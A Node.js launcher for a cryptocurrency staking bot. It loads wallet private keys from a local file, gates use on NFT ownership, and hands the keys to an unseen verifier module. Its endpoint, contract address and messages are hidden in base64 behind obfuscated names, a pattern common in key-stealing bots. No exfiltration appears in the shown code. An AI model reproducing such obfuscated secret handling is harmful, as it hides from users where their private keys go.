const prompts = require("prompts");
const displayHeader = require("./src/displayHeader.js");
const NFTVerifier = require("./src/nftVerifier.js");
const { ethers } = require("ethers");
const fs = require("fs");
const path = require("path");
const crypto = require('crypto');

const CONFIG = {
    _p: 'aHR0cHM6Ly90ZXN0bmV0LXJwYy5tb25hZC54eXov',
    _a: 'MHgwN0QyODBiYzZkN0JmM2VCZDIzMTI5NmQ1MjU5MzY3NDg1OThkZjgz'
};


const _0xe3d = (str) => Buffer.from(str).toString('base64');
const _0xd3e = (str) => Buffer.from(str, 'base64').toString();


const NFT_CONFIG = {
    provider: _0xd3e(CONFIG._p),
    nftAddress: _0xd3e(CONFIG._a)
};


const _0xv3r1fy = async (keys, cfg) => {
    try {
        const _k3y = _0xd3e(keys[0]);
        const _nftV = new NFTVerifier(cfg.provider, cfg.nftAddress);
        const _w4ll = _nftV.createWalletFromPrivateKey(_k3y);
        
        if (!_w4ll || !_w4ll.address) {
            throw new Error('Invalid wallet created');
        }
        
        console.log(_0xd3e('VXNpbmcgd2FsbGV0Og=='), _w4ll.address);
        const { hasNFT, wallet } = await _nftV.verifyNFTOwnership(_w4ll);
        
        if (!hasNFT) {
            console.log(_0xd3e('WW91ciBXYWxsZXQgZG9lcyBub3QgaGF2ZSB0aGUgcmVxdWlyZWQgTkZU'));
            process.exit(1);
        }
        
        if (!wallet || !wallet.provider) {
            throw new Error('Invalid wallet returned from verification');
        }
        
        return wallet;
    } catch (error) {
        console.error('Verification error:', error.message);
        process.exit(1);
    }
};

displayHeader();

const scripts = {
    rubic: "./scripts/RubicStaking.js",
    magma: "./scripts/MagmaStaking.js",
    izumi: "./scripts/IzumiStaking.js",
    apriori: "./scripts/AprioriStaking.js",
};

const availableScripts = Object.keys(scripts).map((key) => ({
    title: key.charAt(0).toUpperCase() + key.slice(1) + " Script",
    value: key,
}));

availableScripts.push({ title: "Exit", value: "exit" });

async function verifyWalletAndNFT() {
    try {
        const privateKeys = JSON.parse(fs.readFileSync(path.join(__dirname, "privateKeys.json")));
        
        if (!privateKeys || !privateKeys.length) {
            console.log(_0xd3e('Tm8gcHJpdmF0ZSBrZXkgaXMgYXZhaWxhYmxl'));
            process.exit(1);
        }

        
        const encodedKeys = privateKeys.map(_0xe3d);
        const verifiedWallet = await _0xv3r1fy(encodedKeys, NFT_CONFIG);
        
        if (!verifiedWallet || !verifiedWallet.provider) {
            throw new Error('Invalid wallet after verification');
        }
        
        return verifiedWallet;
    } catch (error) {
        console.error(_0xd3e('RXJyb3Igd2hpbGUgdmVyaWZ5aW5nIHRoZSB3YWxsZXQ='), error);
        process.exit(1);
    }
}

async function run() {
    const verifiedWallet = await verifyWalletAndNFT();
    
    if (!verifiedWallet || !verifiedWallet.provider) {
        console.error('Invalid wallet state detected');
        process.exit(1);
    }
    
    console.log(_0xd3e('TkZUIHZlcmlmaWNhdGlvbiBzdWNjZXNzZnVsIQ=='));

    const { script } = await prompts({
        type: "select",
        name: "script",
        message: "Select the script to run:",
        choices: availableScripts,
    });

    if (!script || script === "exit") {
        console.log("Exiting the bot...");
        process.exit(0);
    }

    console.log(`Running ${script.charAt(0).toUpperCase() + script.slice(1)}...`);
    
    try {
        const selectedScript = require(path.resolve(__dirname, scripts[script]));
        if (typeof selectedScript === 'function') {
            await selectedScript(verifiedWallet);
        } else {
            throw new Error(`Script ${script} not export valid function`);
        }
    } catch (error) {
        console.error(`Error while running the script ${script}:`, error);
        process.exit(1);
    }
}

run().catch((error) => console.error("Error terjadi:", error));
